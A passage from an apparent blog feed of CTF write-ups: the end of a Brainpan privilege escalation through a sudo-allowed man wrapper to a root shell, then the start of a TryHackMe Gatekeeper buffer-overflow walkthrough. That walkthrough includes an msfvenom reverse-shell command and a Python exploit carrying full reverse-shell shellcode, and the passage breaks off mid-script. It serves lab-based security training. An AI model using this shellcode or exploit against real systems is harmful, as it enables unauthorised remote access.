+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User puck may run the following commands on this host:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> NOPASSWD: /home/anansi/bin/anansi_util
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">puck@brainpan:/home/puck$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Nice!&lt;/p>
+&lt;p>We can see that we can run anansi_util with root&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo /home/anansi/bin/anansi_util
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: /home/anansi/bin/anansi_util &lt;span class="o">[&lt;/span>action&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Where &lt;span class="o">[&lt;/span>action&lt;span class="o">]&lt;/span> is one of:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - network
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - proclist
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - manual &lt;span class="o">[&lt;/span>command&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The interessing thing is the manual command, which is the man command.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo /home/anansi/bin/anansi_util manual /bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/man: manual-/bin/sh: No such file or directory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/man: manual_/bin/sh: No such file or directory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No manual entry &lt;span class="k">for&lt;/span> manual
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNING: terminal is not fully functional
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- &lt;span class="o">(&lt;/span>press RETURN&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DASH&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> BSD General Commands Manual DASH&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NAME
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash — &lt;span class="nb">command&lt;/span> interpreter &lt;span class="o">(&lt;/span>shell&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SYNOPSIS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>command_file &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash -c &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> command_string &lt;span class="o">[&lt;/span>command_name &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash -s &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DESCRIPTION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash is the standard &lt;span class="nb">command&lt;/span> interpreter &lt;span class="k">for&lt;/span> the system. The current
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> version of dash is in the process of being changed to conform with the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> POSIX 1003.2 and 1003.2a specifications &lt;span class="k">for&lt;/span> the shell. This version has
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> many features which make it appear similar in some respects to the Korn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> shell, but it is not a Korn shell clone &lt;span class="o">(&lt;/span>see ksh&lt;span class="o">(&lt;/span>1&lt;span class="o">))&lt;/span>. Only features des‐
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ignated by POSIX, plus a few Berkeley extensions, are being incorporated
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> into this shell. This man page is not intended to be a tutorial or a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">complete&lt;/span> specification of the shell.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Manual page sh&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> line &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>press h &lt;span class="k">for&lt;/span> &lt;span class="nb">help&lt;/span> or q to quit&lt;span class="o">)&lt;/span>!/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">!/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And just like that we got a root shell!&lt;/p></description></item><item><title>Gatekeeper Writeup THM</title><link>https://simonefelici.github.io/p/gatekeeper-writeup-thm/</link><pubDate>Wed, 03 Jan 2024 16:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/gatekeeper-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1580047750144-2c7790adf461?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Gatekeeper Writeup THM" />&lt;p>First of all we do a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-03 08:03 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.058s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">989&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31337/tcp open Elite
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49152/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49153/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49154/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49155/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49161/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49167/tcp open unknown
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First of all I am going to enumerate SAMBA&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Sharename Type Comment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --------- ---- -------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ADMIN$ Disk Remote Admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> C$ Disk Default share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPC$ IPC Remote IPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Users Disk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smbclient //10.10.211.241/Users
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . DR &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:57:08 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. DR &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:57:08 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Default DHR &lt;span class="m">0&lt;/span> Tue Jul &lt;span class="m">14&lt;/span> 03:07:31 &lt;span class="m">2009&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> desktop.ini AHS &lt;span class="m">174&lt;/span> Tue Jul &lt;span class="m">14&lt;/span> 00:54:24 &lt;span class="m">2009&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Share D &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:58:07 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7863807&lt;/span> blocks of size 4096. &lt;span class="m">3876514&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In the share directory I have found an exe file, which I am going to transfer in my windows machine.&lt;/p>
+&lt;p>I setted up my windows machine with Immunity Debugger+ mona.py, and I wrote a script to gain inital access.&lt;/p>
+&lt;p>I found the offset by writing in the prompt the output of this command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m">700&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then after the crash I wrote in the immunity prompt&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">!mona findmsp -distance &lt;span class="m">700&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The results will give you the offset.&lt;/p>
+&lt;p>I found out the bad chars and jump point with mona too.&lt;/p>
+&lt;p>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b &amp;ldquo;&lt;badchars>&amp;rdquo; -f c&lt;/p>
+&lt;p>I then added some NOPs and wrote this python script:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">import socket
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.98.109&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">31337&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">146&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">overflow&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> * offset
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">retn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\xc3\x14\x04\x08&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">padding&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span> * &lt;span class="m">16&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;\xdb\xd4\xbb\xde\xb4\xa5\xcc\xd9\x74\x24\xf4\x58\x29\xc9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x1e\xb0\x47\x39\x62&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x51\x05\xc2\x9a\xa2\x6a\x4a\x7f\x93\xaa\x28\xf4\x84\x1a&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x3a\x58\x29\xd0\x6e\x48\xba\x94\xa6\x7f\x0b\x12\x91\x4e&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x8c\x0f\xe1\xd1\x0e\x52\x36\x31\x2e\x9d\x4b\x30\x77\xc0&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa6\x60\x20\x8e\x15\x94\x45\xda\xa5\x1f\x15\xca\xad\xfc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xee\xed\x9c\x53\x64\xb4\x3e\x52\xa9\xcc\x76\x4c\xae\xe9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xc1\xe7\x04\x85\xd3\x21\x55\x66\x7f\x0c\x59\x95\x81\x49&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x5e\x46\xf4\xa3\x9c\xfb\x0f\x70\xde\x27\x85\x62\x78\xa3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x3d\x4e\x78\x60\xdb\x05\x76\xcd\xaf\x41\x9b\xd0\x7c\xfa&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa7\x59\x83\x2c\x2e\x19\xa0\xe8\x6a\xf9\xc9\xa9\xd6\xac&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xf6\xa9\xb8\x11\x53\xa2\x55\x45\xee\xe9\x31\xaa\xc3\x11&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xc2\xa4\x54\x62\xf0\x6b\xcf\xec\xb8\xe4\xc9\xeb\xbf\xde&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xae\x63\x3e\xe1\xce\xaa\x85\xb5\x9e\xc4\x2c\xb6\x74\x14&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xd0\x63\xda\x44\x7e\xdc\x9b\x34\x3e\x8c\x73\x5e\xb1\xf3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x64\x61\x1b\x9c\x0f\x98\xcc\xa9\xdd\xb6\x78\xc6\xe3\xb6&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x91\x4a\x6d\x50\xfb\x62\x3b\xcb\x94\x1b\x66\x87\x05\xe3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xbc\xe2\x06\x6f\x33\x13\xc8\x98\x3e\x07\xbd\x68\x75\x75&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x68\x76\xa3\x11\xf6\xe5\x28\xe1\x71\x16\xe7\xb6\xd6\xe8&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xfe\x52\xcb\x53\xa9\x40\x16\x05\x92\xc0\xcd\xf6\x1d\xc9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x80\x43\x3a\xd9\x5c\x4b\x06\x8d\x30\x1a\xd0\x7b\xf7\xf4&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x92\xd5\xa1\xab\x7c\xb1\x34\x80\xbe\xc7\x38\xcd\x48\x27&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x88\xb8\x0c\x58\x25\x2d\x99\x21\x5b\xcd\x66\xf8\xdf\xed&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x84\x28\x2a\x86\x10\xb9\x97\xcb\xa2\x14\xdb\xf5\x20\x9c&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa4\x01\x38\xd5\xa1\x4e\xfe\x06\xd8\xdf\x6b\x28\x4f\xdf&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xb9&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">postfix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">buffer&lt;/span> &lt;span class="o">=&lt;/span> overflow + retn + padding + payload + postfix
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">s&lt;/span> &lt;span class="o">=&lt;/span> socket.socket&lt;span class="o">(&lt;/span>socket.AF_INET, socket.SOCK_STREAM&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">try:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.connect&lt;span class="o">((&lt;/span>ip, port&lt;span class="o">))&lt;/span>
